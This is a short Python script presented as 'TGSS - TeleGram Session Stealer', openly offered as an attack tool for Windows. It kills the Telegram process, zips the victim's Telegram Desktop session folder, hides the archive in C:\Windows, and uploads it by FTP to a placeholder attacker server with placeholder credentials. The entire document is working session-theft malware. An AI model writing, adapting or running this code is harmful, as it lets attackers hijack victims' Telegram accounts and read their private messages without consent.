#!/usr/bin/python  
# Tool name : TGSS - TeleGram Session Stealer (Core Exploit)
# Written by : KsrvcO
# Tested on : 
#       Windows 10 
#       Windows 8 
#       Windows 8.1 
#       Windows 7
import zipfile
import os
import sys
import shutil
import ftplib
os.system("taskkill /IM Telegram.exe /F")
os.system("cls")
logineduser = os.popen("echo %username%").read().replace("\n","")
def zipfolder(foldername, target_dir):            
    zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            zipobj.write(fn, fn[rootlen:])
zipfolder('tgss', 'C:\Users\{}\AppData\Roaming\Telegram Desktop'.format(logineduser)) 
newPath = shutil.move('tgss.zip', 'c:\Windows')
session = ftplib.FTP('ServerIPAddr','Username','Password')
file = open('c:/Windows/tgss.zip','rb')
session.storbinary('STOR tgss.zip', file)
file.close()
session.quit()
